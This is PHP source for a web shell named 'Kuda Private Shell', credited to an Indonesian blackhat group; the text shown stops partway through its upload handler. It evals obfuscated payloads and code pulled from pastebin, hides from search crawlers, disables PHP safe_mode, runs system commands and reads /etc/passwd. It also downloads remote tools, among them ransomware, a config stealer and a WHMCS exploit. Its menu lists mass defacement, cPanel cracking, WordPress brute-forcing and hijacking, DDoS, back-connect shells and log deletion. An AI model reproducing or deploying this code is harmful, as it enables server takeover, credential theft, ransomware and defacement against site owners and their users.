<?php
session_start();
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors',0);
$katasandi = 'fddd7dce121719c9aab2ded76867d2f9';
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
// Function biar gak kecache sama google gan :v //
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Google", "Google Chrome", "Robot", "IExplorer", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
function login_shell() {
?>
<?php
eval(gzinflate(str_rot13(base64_decode('SERdeMJAEHwX/A/bQ8hYm7PFN1DAmhMFeNLkeSlST+p6m0C8s5dYxX/fu6R+PR07Mzs7e4ubT4LT7/k3bjRu7zGFGXteQLxtTcwn4N4TMqd5V1XIwo5s9AaE0KUbmJ5PYqvALzDnttKlrjAYDoawlBqmshHcJx11S9LK/ELJD3rrUGOhMpXBaQErEBT+NEt45LBXFuCM+j20GWKzlCavNPljE/qyoinLScncXR92s8I+r04Yzy/rCUWALsoad0e/qDyf7LoRcM5YXVeRStXhDmW4yguolEdgnUN5DKJEmSD7oqwQtDqU4hu0hKZTyAVDKw7lptmi0BYvZcGt8LzFZGGhgtMmjp9mrrCuA8c7YtW9TBpa2ds4oe7aZiB6s1Cu4UU5cCzOc0TKTVos1TX9YhRUVivwyXbaOQB2z2D+3R7QGf0B'))));
?>
<?php
eval(gzinflate(str_rot13(gzinflate(base64_decode('AYoAdf8tjcsKwjAUUfeB/sMlCNGVXXjSnbhk6UFRb2X7oHphVUXrA//dCF0dc+DMZ/VtaDsezhfRQkk/xRWUAjGXcm2LWsE+BVDTEghsD5U06BJz1hRTGDG1cRX3FBOvcef8lCC9POZXxzhGsBycHpfMwQ/aYFiDxaD4iZrOTqMd7B7Z3v4nM5YHsS/Y9wc=')))));
?>
<?php
eval(gzinflate(str_rot13(base64_decode(file_get_contents('https://pastebin.com/raw/ndTcvKhp')))));
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($katasandi) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $katasandi) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<link rel='shortcut icon' type='image/png' href='http://i.imgur.com/akJgR9m.png'>
<link rel='stylesheet' type='text/css' href='http://149.56.22.192/~mrxbarakuda/script2/glitch.css'>
<title>Kuda Private Shell</title>
<meta name='author' content='Mr.xBarakuda'>
<meta name='copyright' content='Nusantara_BlackHat'>
<meta charset="UTF-8">
<style type='text/css'>
@import url('http://fonts.googleapis.com/css?family=Share+Tech+Mono');
@import url('http://fonts.googleapis.com/css?family=Iceland');
html {
background: #111111;
color: #ffffff;
font-family: 'Share Tech Mono';
font-size: 12.7px;
width: 100%;
}
#xkuda_load {
background: url("https://maringapost.com.br/ahduvido/wp-content/uploads/sites/4/2017/06/doofi_consulting_detective_with_pipe_and_magnifying_glass_silhouette_-e1348544124904-527x560.png") no-repeat center center;
background-size: 60% 100%;
background-color: rgba(0, 0, 0, 0.18);
position: fixed;
top: 0;
bottom: 0;
left: 0;
right: 0;
margin: 0;
padding: 0;
width: 100%;
height: 100%;
z-index: -1 !important;
}
li {
display: inline;
margin: 1px;
padding: 1px;
}
tr:hover {
background: maroon;
}
table tr:first-child {	
background: #191919;
text-align: center;
color: white;
}
table, th, td {
border-collapse: collapse;
background: transparent;
font-family: 'Share Tech Mono';
font-size: 12.5px;
}
.table_home, .th_home, .td_home {
border: 1px solid deepskyblue;
}
th {
padding: 10px;
}
a {
color: #ffffff;
text-decoration: none;
}
a:hover {
color: #F6D155;
text-decoration: underline;
}
b {
color: #F6D155;
}
input[type=text],input[type=password],input[type=submit] {
background: transparent; 
color: #ffffff; 
border: 1px solid #ffffff; 
margin: 5px auto;
padding-left: 5px;
font-family: 'Share Tech Mono';
font-size: 12.5px;
}
input[type=submit] {
background: #191919; 
color: #ffffff; 
border: 1px solid #ffffff; 
margin: 5px auto;
padding-left: 5px;
font-family: 'Share Tech Mono';
font-size: 12.5px;
cursor: pointer;
}
textarea {
border: 1px solid #ffffff;
width: 100%;
height: 400px;
padding-left: 5px;
margin: 10px auto;
resize: none;
background: transparent;
color: #ffffff;
font-family: 'Share Tech Mono';
font-size: 12.5px;
}
select {
width: 152px;
background: #000000; 
color: dimgray; 
border: 1px solid #ffffff; 
margin: 5px auto;
padding-left: 5px;
font-family: 'Share Tech Mono';
font-size: 12.5px;
}
option:hover {
background: dimgray;
color: #000000;
}
.mybox {
-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;
}
.cgx2 { text-align: center;letter-spacing:1px;font-family: 'Share Tech Mono';color: #ff0000;font-size:13px;text-shadow: 5px 5px 5px black; }
</style>
</head>
<?php
// Kuda Private Shell Source COd3 /////////////////////////////////
// Rec0d3d by Mr.xBarakuda From Nusantara Blackhat Shell  ////////
if(file_exists('php.ini')) {
} else {
    $img = fopen('php.ini','w');
    $sec = 'safe_mode = OFF
    disable_functions = NONE';
    fwrite($img,$sec);
    fclose($img);
}
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=cyan>".$perm."</font>";
    }
}
function exe($cmd) {
    if(function_exists('system')) {        
        @ob_start();       
        @system($cmd);     
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('exec')) {        
        @exec($cmd,$results);      
        $buff = "";        
        foreach($results as $result) {         
            $buff .= $result;      
        } return $buff;    
    } elseif(function_exists('passthru')) {        
        @ob_start();       
        @passthru($cmd);       
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('shell_exec')) {      
        $buff = @shell_exec($cmd);     
        return $buff;  
    }
}
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
            curl_close($curl);
    return $content;
}
function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = array();
    $lll = array();
    while($npage <= $npages) {
        $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
        if($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
            $npage = $npage + 10;
            if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
        } else break;
    }
    $URLs = array();
    foreach($allLinks as $url){
        $exp = explode("/", $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach($array as $domain) {
        echo $domain."\n";
    }
}
function reverse($url) {
    $ch = curl_init("http://domains.yougetsignal.com/domains.php");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
          curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_POST, 1);
    $resp = curl_exec($ch);
    $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
    $array = explode(",,", $resp);
    unset($array[0]);
    foreach($array as $lnk) {
        $lnk = "http://$lnk";
        $lnk = str_replace(",", "", $lnk);
        echo $lnk."\n";
        ob_flush();
        flush();
    }
        curl_close($ch);
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
    $_COOKIE = idx_ss($_COOKIE);
}
$d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		}
function CreateTools($names,$lokasi){
	if ( $_GET['make_love'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/kuda_tools/".$names.".php";
if (file_exists('kuda_tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Kelar!");window.location.href = "kuda_tools/'.$names.'.php";</script> ';
	}
	else {mkdir("kuda_tools", 0777);
file_put_contents('kuda_tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Kelar!");window.location.href = "kuda_tools/'.$names.'.php";</script> ';}}}

CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("bukalapak","http://pastebin.com/raw/6CB8krDi");
CreateTools("tokped","http://pastebin.com/raw/dvhzWgby");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
CreateTools("shellshock","https://pastebin.com/raw/ZB3DLXwR");
CreateTools("rootex","https://pastebin.com/raw/PVPfA21i");
CreateTools("lokmed","https://pastebin.com/raw/0STXanAx");
CreateTools("iptrack","https://pastebin.com/raw/tGEFiPYm");
CreateTools("webdav","https://pastebin.com/raw/8szajjXK");
CreateTools("webconsole","https://pastebin.com/raw/2i96fDCN");
CreateTools("sqlscan","https://pastebin.com/raw/3jwmYBzc");
CreateTools("symconf","https://pastebin.com/raw/7MXnDzUd");
CreateTools("blackhat","http://pastebin.com/raw/3L2ESWeu");
CreateTools("noname","https://pastebin.com/raw/NXidmXn5");
CreateTools("berandal","https://pastebin.com/raw/FwS49Fy2");
CreateTools("wso404","https://pastebin.com/raw/BMTGUY6J");
if(isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($dir);
} else {
    $dir = getcwd();
}
$orang_gans = '8y3Sq2NXLFfMLlpWBAA=';
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$sport = $_SERVER['SERVER_PORT'];
$admin_id = $_SERVER['SERVER_ADMIN'];
$ssoftware = $_SERVER['SERVER_SOFTWARE'];
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$ling="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?make_love";
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=deepskyblue>OFF</font>";
$magico = (ini_get('magic_quotes_gpc') == '1') ? "<font color=red>ON</font>" : "<font color=deepskyblue>OFF</font>";
$opnbsd = (!ini_get('open_basedir') != 'on') ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>"; 
$getds = @ini_get("disable_functions");
$ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=deepskyblue>NONE</font>";
$mysql = (function_exists('mysql_connect')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$pgsql = (function_exists('pg_connect')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$orac = (function_exists('ocilogon')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$mssql = (function_exists('mssql_connect')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$fget = (function_exists('file_get_contents')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
$gue = (gzinflate(str_rot13(base64_decode($orang_gans))));
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
echo "<br><div class='container'><h1>&otimes; Kuda Private Shell &otimes;</h1><h1>&otimes; Kuda Private Shell &otimes;</h1><h1>&otimes; Kuda Private Shell &otimes;</h1><h1>&otimes; Kuda Private Shell &otimes;</h1></div><br>";
echo "<hr color=deepskyblue>";
echo "System: <font color=deepskyblue>".$kernel."</font><br>";
echo "Host: <font color=deepskyblue>".$_SERVER['SERVER_NAME']."</font> | Admin: <font color=deepskyblue>".$admin_id."</font><br>";
echo "Server Software: <font color=deepskyblue>".$ssoftware."</font> | PHP Version: <font color=deepskyblue>".phpversion()."</font> on <font color=deepskyblue>".php_sapi_name()."</font><br>";
echo "User: <font color=deepskyblue>".$user."</font> ( ".$uid." ) Group: <font color=deepskyblue>".$group."</font> ( ".$gid." )<br>";
echo "Server IP: <font color=deepskyblue>".$ip."</font> | Your IP: <font color=deepskyblue>".$_SERVER['REMOTE_ADDR']."</font> | Your Port: <font color=deepskyblue>".$_SERVER['REMOTE_PORT']."</font><br>";
echo "Your User Agent: <font color=deepskyblue>".$_SERVER['HTTP_USER_AGENT']."</font><br>";
echo "HDD: <font color=deepskyblue>".$used."</font> ( Total: <font color=deepskyblue>".$total."</font> ) ( Free: <font color=deepskyblue>".$freespace."</font> )<br>";
echo "Websites: <font color=deepskyblue>".$count."</font> Domains<br>";
echo "Port: <font color=deepskyblue>".$sport."</font><br>";
echo "Time On Server: <font color=deepskyblue>".date("d-M-Y / h:i a")."</font><br>";
echo "Safe Mode: ".$sm."<br>";
echo "Magic_quotes_gpc: ".$magico."<br>";
echo "Disable Functions: ".$ds."<br>";
echo "MYSQL: ".$mysql." | MSSQL: ".$mssql." | POSTGRESQL: ".$pgsql." | PERL: ".$perl." | PYTHON: ".$python." | WGET: ".$wget." | CURL: ".$curl." | ORACLE: ".$orac." | FILE_GET_CONTENTS: ".$fget." | OPEN_BASEDIR: ".$opnbsd."<br>";
echo "CWD: ";
foreach($scdir as $c_dir => $cdir) {   
    echo "<a href='?dir=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
        if($i != $c_dir) {
        echo "/";
        }
    }
    echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo "<hr color=deepskyblue>";
echo "<center>";
echo "<ul><font face='Iceland' size='3.9px'>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?'>Home</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=upload'>Upload</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cmd'>Command</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=mass_deface'>Mass Deface</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=xaivhost'>Vhost Config Grabber</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=config'>Config</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=configv2'>Config v2</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?fuck=config'>Config Fucker</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=jumping'>Jumping</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cpcrack'>CPanel Crack</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=smtp'>SMTP Grabber</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=zoneh'>Zone-H</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=malware'>Malware Tools</a></li>";
echo "<p>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=spam_mail'>Mail Spammer</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=fake_root'>Fake Root</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?expl=timthumb'>Wp TimThumb Finder</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_wp'>Wp Auto Edit Title</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_dwp'>Wp Auto Deface</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_dwp2'>Wp Auto Deface V.2</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=wpbf'>Wp Bruteforce</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=hijack_wp'>Wp Auto Hijack</a></li>";
echo "<p>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=ddos'>DDoS</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=domains'>Domains Viewer</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=ports'>Port Scanner</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=adminer'>Adminer</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=csrf'>CSRF Online</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=bctools'>Back Connect</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=hashgen'>Hash Generator</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=hashid'>Hash Identification</a></li>";
echo" <p>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=endecode'>EN/DEcoder</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=symlink'>Symlink Server</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=sympy'>Symlink Python</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&bypass=disablefunc'>Disable Functions</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?weevely'>Weevely</a></li>";
echo "<p>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=honey'>Honeypot</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=zip_menu'>Zip Menu</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=infosec'>Server Info</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=phpinfo'>PHP Info</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?whmcs=killer'>WHMCS Killer</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=whmcsdeco'>WHMCS Decoder</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=dbdump'>DB Dump</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=vb_ngindex'>VB Index Changer</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=reverse_ip'>Reverse IP</a></li>";
echo "<p>";
echo "<li><a style='border:2px dotted red;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=kill'>Kill Self</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=loghunter'>Log Hunter</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cgitelnet'>CGI Telnet</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?shell=scanner'>Shell Scanner v1.1</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=shellscan'>Shell Scanner</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=drupalex'>Drupal Mass Exploiter</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=delogs'>Delete Log</a></li>";
echo "<li><a style='border:2px dotted red;width:80px;padding:0px 8px 0px 8px;' href='?logout=true'>Logout</a></li>";
echo "<p>";
echo "<li><a style='border:2px dotted red;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=about'>About</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=w00t'>Auto Root</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=base64pict'>Convert Pict To Base64</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px:padding:0px 8px 0px 8px;' href='?ran=encrypted'>Ransomware</a></li>";
echo "<li><a style='border:2px dotted deepskyblue;width:80px:padding:0px 8px 0px 8px;' href='?do=r00t'>Simple Root</a></li>";
echo "<li><a style='border:2px dotted red;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=contact'>Contact</a></li>";
echo "</font></ul>";
echo "</center>";
echo "<hr color=deepskyblue>";
echo "<div id='xkuda_load'></div>";
if($_GET['logout'] == true) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
}
if($_GET['whmcs'] == 'killer') {
    echo'<form method="post">
      <center>
        <br><u>Input WHMCS configuration.php</u><br><textarea cols="60" name="azztssns" rows="20"></textarea><br><br><input style="color:red;background-color:#000000" name="conf" size="10"
          value="Fuck it!!!" type="submit">
        <br/>
    </form>
    </center>';
    if ($_POST['conf']) {
    $configuration = $_POST['azztssns'];
    file_put_contents("configuration.php",$configuration,FILE_APPEND);
    $scr = file_get_contents("http://pastebin.com/raw/31kP3Dp8");
    $fel = fopen("wk.php", "w");
    fwrite($fel, $scr);
    system('wget -O wk.php http://pastebin.com/raw/31kP3Dp8');
    echo'<meta http-equiv="refresh" content="0; url=wk.php">';
    }
}
function inject($pastebin, $nama_file){
    $usa = file_get_contents("$pastebin");
    $frr = fopen("$nama_file", 'w');
    fwrite($frr, $usa);
}
$shell = @$_GET['shell'];
if($shell == "scanner"){
    $asw = inject("https://pastebin.com/raw/F0QPqWnn", "kudascan.php");
    echo '<center><a href="kudascan.php" target="_blank"><font color="lime">> SCANNER SHELL <</a></font></center>';
}
$ran = @$_GET['ran'];
if($ran == "encrypted"){
    $bat = inject("https://pastebin.com/raw/TAEZ94n2", "ransom.php");
    echo '<center><a href="ransom.php" target="_blank"><font color="lime">> RANSOMWARE <</a></font></center>';
}
$fuck = @$_GET['fuck'];
if($fuck == "config"){
    $kentod = inject("https://pastebin.com/raw/YSN78zrm", "confuck.php");
    echo '<center><a href="confuck.php" target="_blank"><font color="lime">> CONFIG FUCKER <</a></font></center>';
}
$expl = @$_GET['expl'];
if($expl == "timthumb"){
    $ea = inject("https://pastebin.com/raw/Fn4X835C", "exptimthumb.php");
    echo '<center><a href="exptimthumb.php" target="_blank"><font color="lime">> TIMTHUMB <</a></font></center>';
}
elseif($_GET['do'] == 'upload') {
    echo "<center>";
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        } else {
            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
            $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
